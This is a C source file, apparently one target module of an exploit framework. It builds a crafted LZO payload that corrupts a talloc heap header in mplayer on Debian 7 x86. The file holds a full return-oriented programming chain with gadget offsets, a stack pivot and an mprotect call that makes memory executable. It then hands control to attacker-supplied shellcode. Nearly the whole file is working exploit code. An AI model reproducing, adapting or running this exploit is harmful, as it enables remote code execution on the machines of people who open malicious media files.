/* Copyright (C) 2014 Lab Mouse Security
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
/*
###############################################################
#
# gadget chain
#

# stack pivot chain
#
_usr_bin_mplayer: asm=RET found at offset=201100 realistic_peer=1,1
LEAVE

# stack padding chain
#
# first, put talloc headerin eax
_usr_bin_mplayer: asm=RET found at offset=214328 realistic_peer=5,4
MOV EAX, ESI
POP ESI
POP EDI
POP EBP

# next, ensure talloc header is masked 
_usr_bin_mplayer: asm=RET found at offset=219361 realistic_peer=4,2
DEC EAX
ADD ESP, 0x4c

_usr_bin_mplayer: asm=RET found at offset=204966 realistic_peer=17,6
MOV [ESP+0x14], EAX
POP EBX
JMP 0x8081520
NOP
MOV EAX, 0xffffffff
POP EBX
   0x8081520 <m_property_int_ro>:       mov    0x8(%esp),%edx
   0x8081524 <m_property_int_ro+4>:     mov    0xc(%esp),%eax
   0x8081528 <m_property_int_ro+8>:     test   %edx,%edx
   0x808152a <m_property_int_ro+10>:    je     0x8081538 <m_property_int_ro+24>
   0x808152c <m_property_int_ro+12>:    mov    $0xfffffffe,%eax
   0x8081531 <m_property_int_ro+17>:    ret

_usr_bin_mplayer: asm=RET found at offset=220298 realistic_peer=1,1
POP EBP		# skip empty space

# mprotect@plt
#
0x0806ffb0

# call_shellcode chain
#
_usr_bin_mplayer: asm=RET found at offset=203440 realistic_peer=3,1
ADD ESP, 0x2c		# skip past junk

_usr_bin_mplayer: asm=RET found at offset=200975 realistic_peer=19,7
PUSH ESP		# now, return directly to shellcode payload which is next on stack
NOP
NOP
MOV EAX, 0x8332b03
SUB EAX, 0x8332b00
CMP EAX, 0x6
JA 0x8079111		# branch never taken

#
###############################################################
*/

#include <crush.h>

#ifdef DEBUG
# define FAKE_REGISTER 			0xb8b8b8b8UL
#else
# define FAKE_REGISTER			0x00000000
#endif

#define FRAME_BYTES 			(1024 + 256)

#define GADGET_BASE_ADDRESS		0x08048000UL
#define GADGET_ADDRESS(x, y)		(GADGET_BASE_ADDRESS + (x) - (y))

#define STACK_PIVOT_G1 			GADGET_ADDRESS(201100, 1)

#define STACK_PADDING_G1		GADGET_ADDRESS(214328, 5)
#define STACK_PADDING_G2		GADGET_ADDRESS(219361, 4)
#define STACK_PADDING_G3		GADGET_ADDRESS(204966, 17)
#define STACK_PADDING_G4		GADGET_ADDRESS(220298, 1)
#define STACK_PADDING_SIZE		0x4c

#define MPROTECT_AT_PLT			0x0806ffb0UL

#define CALL_SHELLCODE_G1		GADGET_ADDRESS(203440, 3)
#define CALL_SHELLCODE_G2		GADGET_ADDRESS(200975, 19)

static Boolean
build(unsigned char const * input, int ninput, unsigned char ** output, int * noutput)
{
	unsigned char * buffer;
	unsigned char * p;
	unsigned char * q;
	unsigned int * l;
	int n;

	if(ninput > NSIZE)
	{
		error(False, "payload size exceeds maximum (%d > %d)", ninput, NSIZE);
		return False;
	}

	buffer = calloc(1024, (64 * 1024));
	if(!buffer)
	{
		error(True, "memory allocation failed");
		return False;
	}

	p = buffer;

	{
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 0;
		*p++ = 242;

		q = p;

		/* stack pivot */
		l = (unsigned int * )q;
		*l++ = FAKE_REGISTER;
		*l++ = STACK_PADDING_G1;

		/* stack padding */
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = FAKE_REGISTER;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G2;

		q = (unsigned char * )l;
		q += STACK_PADDING_SIZE;
		l = (unsigned int * )q;
		*l++ = STACK_PADDING_G3;

		*l++ = FAKE_REGISTER; /* ebx */
		*l++ = STACK_PADDING_G4;
		*l++ = FAKE_REGISTER; 
		*l++ = MPROTECT_AT_PLT;
		*l++ = CALL_SHELLCODE_G1;
		*l++ = FAKE_REGISTER; 
		*l++ = 4096;
		*l++ = 7;
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = FAKE_REGISTER; 
		*l++ = CALL_SHELLCODE_G2;

		n = (char * )l - (char * )p;

		msg(MsgVerbose, "total of %d bytes encoded to fake frames", n);

		n = FRAME_BYTES - n;
		p = (unsigned char * )l;

		msg(MsgVerbose, "total of %d bytes for payload (don't trust this value)", n);

		q = p;
		p += n;

		/* we now start the payload at the beginning of the executable segment */
                /* the rest of the shellcode payload goes here */
		memcpy(q, input, ninput);

		/* implement the LZO pointer corruption here */
		*p++ = 32;
		p += 16843003;
		*p++ = (139 + 23 + 28);

		/* now implement the copy to corrupt the talloc header */
		*p++ = 16;
		*p++ = 0;
		*p++ = 0; 
		*p++ = 10; /* generate 4 bytes */

		/* overwrite the talloc header */
		l = (unsigned int * )p;
		*l++ = STACK_PIVOT_G1;
		*l++ = 0;
		*l++ = 0;
		*l++ = TALLOC_MAGIC;
		*l++ = 0;
		*l++ = 0;
		*l++ = 0;

		p = (unsigned char * )l;

		/* exit without error */
		*p++ = 17;
		*p++ = 0;
		*p++ = 0;
	}

	*noutput = p - buffer;
	*output = buffer;

	return True;
}

Crushlet 
debian_7_0_0_x86 = 
{
	"debian_7_0_0_x86",
	Platform_Linux,
	Architecture_x86,

	NULL,
	NULL,
	build
};

